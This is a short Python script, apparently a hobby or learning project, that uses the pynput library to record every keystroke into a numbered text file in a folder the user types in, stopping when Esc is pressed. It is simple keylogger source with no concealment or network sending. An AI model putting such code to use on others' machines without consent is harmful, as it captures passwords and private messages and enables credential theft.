import os
import numpy as np
import pynput
from pynput.keyboard import Key, Listener

#Poll user where to store keylogs
print('Input file location for storing keylogs')
print('Example: C:/Users/USERNAME/Desktop')
filepath = input()
#Ensure filepath exists
while not os.path.exists(filepath):
        print('Folder not found, please enter existing folder location')
        filepath = input()

#Check what to call keylog file and set file name
i = 0
while os.path.exists(filepath + '/keylog' + str(i) + '.txt'):
    i+=1
file_name = '/keylog' + str(i) + '.txt'

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)
          
def write_file(keys):
    with open(filepath + file_name, 'w') as f:
        for key in keys:
            # removing '' and writing to file
            f.write(str(key).replace("'", ""))
            # add new line
            f.write('\n')
              
def on_release(key):
    # Stop keylogger when esc is pressed
    if key == Key.esc:
        # Stop listener
        return False
  
  
with Listener(on_press = on_press,
              on_release = on_release) as listener:
                     
    listener.join()